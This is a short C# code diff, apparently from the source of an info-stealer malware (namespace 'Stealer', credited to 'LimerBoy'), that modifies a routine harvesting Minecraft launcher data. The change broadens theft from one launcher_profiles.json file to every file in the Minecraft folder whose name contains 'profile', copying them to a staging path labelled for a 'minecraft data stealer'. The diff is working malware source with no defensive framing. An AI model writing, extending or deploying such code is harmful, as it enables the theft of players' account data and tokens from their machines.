@@ -57,9 +57,13 @@ namespace Stealer // This shit coded by LimerBoy
         // Get profiles 
         private static void SaveProfiles(string sSavePath)
         {
-            string profiles = Path.Combine(MinecraftPath, "launcher_profiles.json");
-            if (!File.Exists(profiles)) return;
-            File.Copy(profiles, sSavePath + "\\launcher_profiles.json");
+            string[] files = Directory.GetFiles(MinecraftPath);
+            foreach (string file in files)
+            {
+                FileInfo Profile = new FileInfo(file);
+                if (Profile.Name.ToLower().Contains("profile"))
+                    Profile.CopyTo(Path.Combine(sSavePath, Profile.Name));
+            }
         }
 
         // Run minecraft data stealer
